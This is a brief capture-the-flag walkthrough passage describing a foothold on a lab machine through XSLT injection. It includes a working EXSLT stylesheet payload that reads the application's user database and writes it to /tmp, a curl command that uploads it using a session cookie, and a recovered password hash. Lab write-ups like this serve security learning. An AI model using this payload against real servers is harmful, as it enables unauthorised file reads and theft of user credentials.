Foothold – XSLT Injection (XXE / File Read + Write)
Authenticated upload endpoint /convert processes user-supplied XSLT with EXSLT extensions enabled.

Read payload (read.xslt):


<?xml version="1.0"?>

<xsl:stylesheet version="1.0"

    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"

    xmlns:exsl="http://exslt.org/common"

    extension-element-prefixes="exsl">

  <xsl:template match="/">

    <exsl:document href="/tmp/db.dump" method="text">

      <xsl:copy-of select="document('/var/www/conversor.htb/instance/users.db')"/>

    </exsl:document>

  </xsl:template>

</xsl:stylesheet>

Curl upload (with valid session= cookie):


curl -X POST http://conversor.htb/convert \

  -F "xml_file=@sample.xml" \

  -F "xslt_file=@read.xslt" \

  -b "session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3QifQ..."

Extracted SQLite DB → MD5 hash 5b5c3ac3a1c897c94caad48e6c71fdec.

